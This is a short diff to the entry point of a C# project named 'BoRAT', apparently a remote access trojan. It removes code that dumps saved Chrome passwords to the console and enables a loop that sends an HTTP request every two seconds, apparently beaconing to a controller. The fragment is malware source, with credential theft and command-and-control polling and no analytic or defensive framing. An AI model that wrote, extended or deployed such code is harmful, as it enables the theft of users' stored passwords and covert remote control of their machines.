@@ -9,13 +9,11 @@ namespace BoRAT
     {
         static void Main(string[] args)
         {
-            foreach (RecoveredAccount acc in Chrome.GetSavedPasswords())
-                Console.Write(acc.ToString());
-            //while(true)
-            //{
-            //    Http.Request();
-            //    Thread.Sleep(2000);
-            //}
+            while(true)
+            {
+                Http.Request();
+                Thread.Sleep(2000);
+            }
 
             Console.ReadKey();
         }
